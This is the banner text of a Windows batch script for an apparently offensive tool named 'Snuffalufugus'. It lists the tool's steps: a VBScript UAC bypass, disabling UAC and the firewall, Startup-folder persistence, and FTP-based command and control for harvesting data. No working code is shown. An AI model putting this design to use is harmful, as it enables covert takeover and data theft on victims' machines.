echo  ~Snuffalufugus~
echo  Requirements:
echo     FTP Client on local machine
echo     Remotely accessible FTP Server
echo     Windows OS Device/VM and target
echo  Description:
echo  C&C over FTP
echo  Enables persistent remote access on a Windows 10 device over FTP
echo  Instructs the following on a target:
echo           Use VBScript to bypass UAC
echo           Launch an Administrative Command Prompt
echo           Disable UAC security feature
echo           Disable Windows Firewall
echo           Enable TFTP Client
echo           Write FTP connect script to users Startup folder  
echo           Force system restart to activating features
echo           Launch a connection to remote FTP server upon startup
echo           Use FTP client "put" and "get" commands to transmit and recieve data with pre-specified file names
echo           Take commands from a remote server to control the system/harvest data
echo.
echo   Notes: Payload Provided is intended for the retreival of system metadata
echo   Future features: Background Persistance,Command Interface with selectable payloads,Adjustable time for reverse connections
